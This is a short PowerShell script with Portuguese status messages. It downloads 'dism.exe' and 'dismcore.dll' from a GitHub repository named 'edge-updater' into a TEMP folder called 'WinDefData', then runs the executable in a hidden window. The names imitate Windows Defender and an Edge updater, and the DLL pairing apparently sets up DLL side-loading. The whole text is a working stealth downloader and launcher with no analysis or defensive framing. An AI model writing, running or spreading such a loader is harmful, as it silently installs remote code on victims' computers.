$d=$env:TEMP+'\WinDefData'
if(!(Test-Path $d)){New-Item $d -Force|Out-Null}
$u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/'
try{
    Write-Host "[1/3] Baixando dismcore.dll..."
    Invoke-WebRequest -Uri ($u+'dismcore.dll') -OutFile "$d\dismcore.dll" -UseBasicParsing
    $s1=(Get-Item "$d\dismcore.dll").Length
    if($s1 -lt 1000){Write-Host "ERRO: dismcore.dll muito pequeno ($s1 bytes)";exit 1}
    Write-Host "OK: dismcore.dll ($s1 bytes)"
}catch{Write-Host "ERRO: $_";exit 1}
try{
    Write-Host "[2/3] Baixando dism.exe..."
    Invoke-WebRequest -Uri ($u+'dism.exe') -OutFile "$d\dism.exe" -UseBasicParsing
    $s2=(Get-Item "$d\dism.exe").Length
    if($s2 -lt 10000){Write-Host "ERRO: dism.exe muito pequeno ($s2 bytes)";exit 1}
    Write-Host "OK: dism.exe ($s2 bytes)"
}catch{Write-Host "ERRO: $_";exit 1}
Write-Host "[3/3] Executando dism.exe..."
Start-Process "$d\dism.exe" -WindowStyle Hidden
Write-Host "OK: dism.exe executado"
